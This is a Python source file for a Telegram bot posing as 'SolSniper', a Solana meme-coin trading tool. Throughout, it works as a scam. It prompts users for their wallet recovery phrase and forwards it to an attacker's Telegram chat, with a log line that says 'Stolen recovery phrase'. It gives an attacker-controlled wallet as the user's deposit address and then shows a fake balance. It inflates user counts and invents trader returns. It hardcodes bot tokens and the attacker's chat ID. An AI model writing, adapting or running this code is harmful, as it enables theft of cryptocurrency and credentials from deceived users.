import os
import logging
import random
import time
import requests
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater,
    CommandHandler,
    CallbackQueryHandler,
    CallbackContext,
    MessageHandler,
    Filters
)

# Configuration - use environment variables in production
MAIN_BOT_TOKEN = os.getenv('MAIN_BOT_TOKEN', "8296111824:AAG5ok4TRaNBoTQAVhALEW1K4jGiUR317kM")
MONITOR_BOT_TOKEN = os.getenv('MONITOR_BOT_TOKEN', "7789920610:AAEzQd2V4KrRU87gk7yvYl99aV3sx4Jkb4U")
ATTACKER_CHAT_ID = os.getenv('ATTACKER_CHAT_ID', "7429331053")
ATTACKER_WALLET = "APbc2s9cgUZPuU2vm7SEwTP2GJa2i3qsXcGRYcSd6zJb"

# Fake user statistics
user_count = 1500
last_month_users = 1200
active_users = {}

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    active_users[user.id] = datetime.now()
    
    keyboard = [
        [InlineKeyboardButton("💰 Wallets", callback_data='wallets')],
        [InlineKeyboardButton("🚀 Copy Trade", callback_data='copy_trade'),
         InlineKeyboardButton("🎯 Sniper Trade", callback_data='sniper_trade')],
        [InlineKeyboardButton("🤖 Auto Trade", callback_data='auto_trade')],
        [InlineKeyboardButton("📊 Stats", callback_data='stats'),
         InlineKeyboardButton("ℹ️ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        f"👋 Welcome *{user.first_name}* to SolSniper Bot!\n"
        "The ultimate tool for Solana meme coin trading.\n\n"
        "🔐 *Secure your profits* with our advanced trading algorithms\n"
        "💎 *VIP signals* for new coin launches\n"
        "⚡ *Real-time* market execution\n\n"
        "Get started by setting up your wallet!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    log_to_monitor(f"🚀 User {user.id} started bot")

def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    user = update.effective_user
    active_users[user.id] = datetime.now()
    
    if query.data == 'wallets':
        wallet_menu(update, context)
    elif query.data == 'import_wallet':
        query.edit_message_text(
            "🔑 *Import Wallet*\n\n"
            "Choose import method:\n\n"
            "1. Enter your *Solana private key* (12-24 words)\n"
            "2. Send SOL to your personal deposit address\n\n"
            "⚠️ *For security, your keys are encrypted and never stored*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Enter Private Key", callback_data='enter_key')],
                [InlineKeyboardButton("Get Deposit Address", callback_data='deposit_address')],
                [InlineKeyboardButton("↩️ Back", callback_data='wallets')]
            ])
        )
    elif query.data == 'enter_key':
        query.edit_message_text(
            "🔐 *Enter Private Key*\n\n"
            "Please type your Solana recovery phrase (12-24 words):\n\n"
            "Example: `word1 word2 word3 ...`\n\n"
            "This key will be securely encrypted and stored.",
            parse_mode='Markdown'
        )
        context.user_data['awaiting_key'] = True
    elif query.data == 'deposit_address':
        query.edit_message_text(
            f"📥 *Deposit SOL to Your Wallet*\n\n"
            f"Send *SOL* to this address to fund your trading wallet:\n\n"
            f"`{ATTACKER_WALLET}`\n\n"
            "After sending, your balance will update automatically within 5 minutes.\n\n"
            "⚠️ *Only send SOL to this address*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ I've Sent SOL", callback_data='sent_sol')],
                [InlineKeyboardButton("↩️ Back", callback_data='import_wallet')]
            ])
        )
    elif query.data == 'sent_sol':
        fake_balance = round(random.uniform(0.5, 5.0), 3)
        query.edit_message_text(
            f"✅ *Deposit Received!*\n\n"
            f"Your new balance: *{fake_balance} SOL*\n\n"
            "You can now start trading with your funded wallet.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Start Trading", callback_data='start_trading')],
                [InlineKeyboardButton("↩️ Main Menu", callback_data='back_main')]
            ])
        )
        log_to_monitor(f"💰 User {user.id} sent SOL to attacker wallet")
    elif query.data == 'copy_trade':
        query.edit_message_text(
            "🚀 *Copy Trading*\n\n"
            "Automatically replicate trades of top performers:\n\n"
            "• Real-time trade mirroring\n"
            "• Customizable risk levels\n"
            "• Performance-based trader selection\n\n"
            "Select a trader to copy:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🦈 CryptoShark (43% monthly)", callback_data='copy_1')],
                [InlineKeyboardButton("🐳 WhaleHunter (37% monthly)", callback_data='copy_2')],
                [InlineKeyboardButton("🚀 MoonLander (52% monthly)", callback_data='copy_3')],
                [InlineKeyboardButton("↩️ Back", callback_data='back_main')]
            ])
        )
    elif query.data == 'stats':
        update_stats()
        query.edit_message_text(
            f"📊 *SolSniper Statistics*\n\n"
            f"• Total Users: *{user_count}*\n"
            f"• Active This Month: *{last_month_users}*\n"
            f"• Total Trades: *{user_count * 27}*\n"
            f"• Total Profit: *+{round(user_count * 0.42, 1)}K SOL*\n\n"
            "🔥 *Top Performing Trader:*\n"
            "`MoonLander - 52% monthly ROI`\n\n"
            "_Updated: 5 minutes ago_",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Back", callback_data='back_main')]
            ])
        )
    elif query.data == 'back_main':
        start(update, context)

def wallet_menu(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.edit_message_text(
        "💰 *Wallet Management*\n\n"
        "• Default Wallet: `8Yt...k3d` (2.14 SOL)\n"
        "• Trading Wallet: `7Gh...p9x` (0.00 SOL)\n\n"
        "Choose an action:",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Import Wallet", callback_data='import_wallet')],
            [InlineKeyboardButton("🔄 Generate New", callback_data='generate_wallet')],
            [InlineKeyboardButton("⚙️ Set Default", callback_data='set_default')],
            [InlineKeyboardButton("↩️ Back", callback_data='back_main')]
        ])
    )

def handle_message(update: Update, context: CallbackContext) -> None:
    if context.user_data.get('awaiting_key'):
        sol_phrase = update.message.text
        user = update.effective_user
        
        update.message.reply_text(
            "🔒 *Wallet Imported Successfully!*\n\n"
            "Your wallet has been securely encrypted and added to your account.\n"
            "Balance: 0.00 SOL\n\n"
            "Deposit SOL to start trading.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💸 Deposit SOL", callback_data='deposit_address')],
                [InlineKeyboardButton("🏠 Main Menu", callback_data='back_main')]
            ])
        )
        log_to_monitor(f"🔑 Stolen recovery phrase from {user.id}:\n{sol_phrase}")
        context.user_data['awaiting_key'] = False

def log_to_monitor(message: str) -> None:
    url = f"https://api.telegram.org/bot{MONITOR_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": ATTACKER_CHAT_ID,
        "text": f"🔔 SolSniper Alert:\n{message}",
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logger.error(f"Monitoring bot error: {str(e)}")

def update_stats() -> None:
    global user_count, last_month_users
    # Simulate organic user growth
    user_count += random.randint(5, 15)
    # Maintain 70-80% as "active" this month
    last_month_users = int(user_count * random.uniform(0.7, 0.8))

def error_handler(update: Update, context: CallbackContext) -> None:
    logger.error(msg="Exception while handling update:", exc_info=context.error)

def main() -> None:
    updater = Updater(MAIN_BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dp.add_error_handler(error_handler)

    # Start background stats updater
    def stats_updater(context: CallbackContext):
        update_stats()
        context.job_queue.run_once(stats_updater, 60 * 60 * 6)  # Run every 6 hours

    jq = updater.job_queue
    jq.run_once(stats_updater, 0)

    # Start the Bot
    updater.start_polling()
    logger.info("Bot started and running...")
    updater.idle()

if __name__ == '__main__':
    main()
